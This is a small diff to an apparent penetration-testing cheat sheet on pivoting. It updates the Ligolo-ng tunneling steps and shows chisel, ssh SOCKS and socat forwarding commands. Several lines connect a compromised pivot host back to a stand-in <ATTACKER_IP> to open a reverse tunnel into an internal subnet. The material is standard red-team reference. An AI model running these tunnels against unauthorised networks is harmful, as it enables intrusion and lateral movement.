@@ -331,10 +331,12 @@ ssh -D 1080 -f -N <USER>@<PIVOT>
 # Attacker: chisel server -p 8000 --reverse
 # Pivot:    chisel client <ATTACKER_IP>:8000 R:socks
 
-# Ligolo-ng (modern — recommended)
-# Attacker: ligolo-proxy -selfcert -laddr 0.0.0.0:11601
-# Pivot:    ligolo-agent -connect <ATTACKER_IP>:11601 -ignore-cert
-# Then add route: ip route add <INTERNAL_SUBNET>/24 dev ligolo
+# Ligolo-ng (modern — recommended). Full setup: tunneling-pivoting.md §Ligolo-ng
+# Attacker: sudo ip tuntap add user $(whoami) mode tun ligolo
+#           sudo ip link set ligolo up
+#           ./proxy -selfcert -laddr 0.0.0.0:11601
+# Pivot:    ./agent -connect <ATTACKER_IP>:11601 -ignore-cert
+# In proxy: session  →  start  →  on attacker: sudo ip route add <INTERNAL_SUBNET>/24 dev ligolo
 
 # Port forward with socat
 socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<INTERNAL_IP>:<PORT>
